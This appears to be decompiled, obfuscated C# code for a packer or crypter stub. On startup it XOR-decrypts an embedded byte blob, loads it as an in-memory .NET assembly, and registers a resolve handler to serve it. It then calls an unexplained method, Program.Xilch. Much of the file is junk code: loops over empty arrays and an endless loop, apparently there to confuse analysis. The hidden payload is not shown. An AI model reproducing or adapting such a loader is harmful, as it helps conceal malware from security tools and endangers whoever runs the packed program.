using System;
using System.Globalization;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Threading;
using nvldumdx;

namespace ns0;

internal sealed class Class0
{
	public static MethodBase smethod_0(BindingFlags bindingFlags_0, MethodBase[] methodBase_0, Type[] type_0, ParameterModifier[] parameterModifier_0)
	{
		Type[] array = new Type[type_0.Length];
		for (int i = 0; i < type_0.Length; i++)
		{
			array[i] = type_0[i].UnderlyingSystemType;
		}
		type_0 = array;
		int num = 0;
		for (int j = 0; j < methodBase_0.Length; j++)
		{
			ParameterInfo[] parameters = methodBase_0[j].GetParameters();
			if (parameters.Length != type_0.Length)
			{
				continue;
			}
			int k;
			for (k = 0; k < type_0.Length; k++)
			{
				Type parameterType = parameters[k].ParameterType;
				if (parameterType != type_0[k] && parameterType != typeof(object) && !parameterType.IsPrimitive && !parameterType.IsAssignableFrom(type_0[k]))
				{
					break;
				}
			}
			if (k == type_0.Length)
			{
				methodBase_0[num++] = methodBase_0[j];
			}
		}
		switch (num)
		{
		case 0:
			return null;
		case 1:
			return methodBase_0[0];
		default:
		{
			int num2 = 0;
			int[] array2 = new int[type_0.Length];
			for (int l = 0; l < type_0.Length; l++)
			{
				array2[l] = l;
			}
			for (int m = 1; m < num; m++)
			{
			}
			return methodBase_0[num2];
		}
		}
	}

	public static byte[] smethod_1(byte[] byte_0, byte[] byte_1)
	{
		for (int i = 0; i < byte_0.Length; i++)
		{
			byte_0[i] ^= byte_1[i % byte_1.Length];
		}
		return byte_0;
	}

	public static bool smethod_2(ResolveEventArgs resolveEventArgs_0)
	{
		return Class4.assembly_0.FullName != resolveEventArgs_0.Name;
	}

	public static Assembly smethod_3(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (smethod_2(resolveEventArgs_0))
		{
			return null;
		}
		return Class4.assembly_0;
	}

	internal static ResolveEventHandler smethod_4()
	{
		return smethod_3;
	}

	public object method_0(object object_0, Type type_0, CultureInfo cultureInfo_0)
	{
		if (cultureInfo_0 == null)
		{
			cultureInfo_0 = CultureInfo.CurrentCulture;
		}
		if (type_0.IsByRef)
		{
			type_0 = type_0.GetElementType();
		}
		if (!type_0.IsPrimitive && type_0.IsInstanceOfType(object_0))
		{
			return object_0;
		}
		Type type = object_0.GetType();
		if (type_0.IsEnum && type.IsPrimitive)
		{
			return Enum.Parse(type_0, object_0.ToString());
		}
		if (type == typeof(DBNull))
		{
			if (type_0 == typeof(DBNull))
			{
				return object_0;
			}
			if ((type_0.IsClass && type_0 != typeof(object)) || type_0.IsInterface)
			{
				return null;
			}
		}
		try
		{
		}
		catch (NotSupportedException)
		{
		}
		return null;
	}

	[SecuritySafeCritical]
	static Class0()
	{
		try
		{
			Class4.byte_0 = Class5.smethod_0("a=7o0ÉP›*0p0²æ");
			byte[] byte_ = Class1.byte_0;
			byte[] array = new byte[16];
			int num = 0;
			int num2 = 0;
			Class3.smethod_0();
			int num3 = ((array.Length - 4 - 0 + 1 - 1 > 255) ? 255 : (array.Length - 4 - num + 1 - 1));
			int num4 = ((num2 >> 12) ^ num2) & 0xFFF;
			byte b = (new byte[4096])[num4];
			int num5 = 0;
			int num6 = 0;
			Class4.appDomain_0 = Thread.GetDomain();
			int i = 0;
			int[,] array2 = new int[0, 0];
			Class4.assembly_0 = Assembly.Load(smethod_1(byte_, Class4.byte_0));
			for (; i < 16 && b > i; i++)
			{
				int num7 = array2[num4, i];
				if ((byte)num2 == array[num7] && (byte)(num2 >> 8) == array[num7 + 1] && (byte)(num2 >> 16) == array[num7 + 2] && num7 < num - 2)
				{
					int j;
					for (j = 3; array[num7 + j] == array[num + j] && j < num3; j++)
					{
					}
					if (j > num5 || (j == num5 && num7 > num6))
					{
						num6 = num7;
						num5 = j;
					}
				}
			}
			Class4.appDomain_0.AssemblyResolve += smethod_4();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	public static PropertyInfo smethod_5(BindingFlags bindingFlags_0, PropertyInfo[] propertyInfo_0, Type type_0, Type[] type_1, ParameterModifier[] parameterModifier_0)
	{
		int i = 0;
		int num = 0;
		int num2 = ((type_1 != null) ? type_1.Length : 0);
		for (int j = 0; j < propertyInfo_0.Length; j++)
		{
			if (type_1 != null)
			{
				ParameterInfo[] indexParameters = propertyInfo_0[j].GetIndexParameters();
				if (indexParameters.Length != num2)
				{
					continue;
				}
				for (i = 0; i < num2; i++)
				{
					Type parameterType = indexParameters[i].ParameterType;
					if (parameterType != type_1[i] && parameterType != typeof(object) && !parameterType.IsPrimitive && !parameterType.IsAssignableFrom(type_1[i]))
					{
						break;
					}
				}
			}
			if (i == num2 && (!(type_0 != null) || propertyInfo_0[j].PropertyType.IsPrimitive || propertyInfo_0[j].PropertyType.IsAssignableFrom(type_0)))
			{
				propertyInfo_0[num++] = propertyInfo_0[j];
			}
		}
		switch (num)
		{
		case 0:
			return null;
		case 1:
			return propertyInfo_0[0];
		default:
		{
			int num3 = 0;
			int[] array = new int[num2];
			for (int j = 0; j < num2; j++)
			{
				array[j] = j;
			}
			for (int j = 1; j < num; j++)
			{
			}
			return propertyInfo_0[num3];
		}
		}
	}

	private static void smethod_6(AppDomain appDomain_0)
	{
	}

	private static void smethod_7(AppDomain appDomain_0)
	{
		try
		{
			string fullName = Assembly.GetCallingAssembly().FullName;
			appDomain_0.CreateInstance(fullName, "");
		}
		catch (Exception ex)
		{
			Console.WriteLine();
			Console.WriteLine(ex.Message);
		}
	}

	internal static T smethod_8<T>(CallSite callSite_0)
	{
		CallSite<Func<CallSite, T>> callSite = (CallSite<Func<CallSite, T>>)callSite_0;
		Func<CallSite, T> func = callSite.Target;
		callSite_0 = callSite;
		Func<CallSite, T>[] array = new Func<CallSite, T>[0];
		Func<CallSite, T> func2;
		if (array != null)
		{
			for (int i = 0; i < array.Length; i++)
			{
				func2 = array[i];
				if (func2 != func)
				{
					callSite.Target = func2;
					func2(callSite_0);
				}
			}
		}
		for (int j = 0; j < array.Length; j++)
		{
			func2 = (callSite.Target = array[j]);
			try
			{
				func2(callSite_0);
			}
			catch
			{
			}
		}
		func2 = null;
		while (true)
		{
			callSite.Target = func;
			func2 = callSite.Target;
			try
			{
				func2(callSite_0);
			}
			catch
			{
			}
		}
	}

	[SecuritySafeCritical]
	public static void Main()
	{
		try
		{
			byte[] array = new byte[16];
			int num = 0;
			int num2 = 0;
			Program.Xilch();
			int num3 = ((array.Length - 4 - 0 + 1 - 1 > 255) ? 255 : (array.Length - 4 - num + 1 - 1));
			int num4 = ((num2 >> 12) ^ num2) & 0xFFF;
			byte b = (new byte[4096])[num4];
			int num5 = 0;
			int num6 = 0;
			int i = 0;
			int[,] array2 = new int[0, 0];
			for (; i < 16 && b > i; i++)
			{
				int num7 = array2[num4, i];
				if ((byte)num2 == array[num7] && (byte)(num2 >> 8) == array[num7 + 1] && (byte)(num2 >> 16) == array[num7 + 2] && num7 < num - 2)
				{
					int j;
					for (j = 3; array[num7 + j] == array[num + j] && j < num3; j++)
					{
					}
					if (j > num5 || (j == num5 && num7 > num6))
					{
						num6 = num7;
						num5 = j;
					}
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
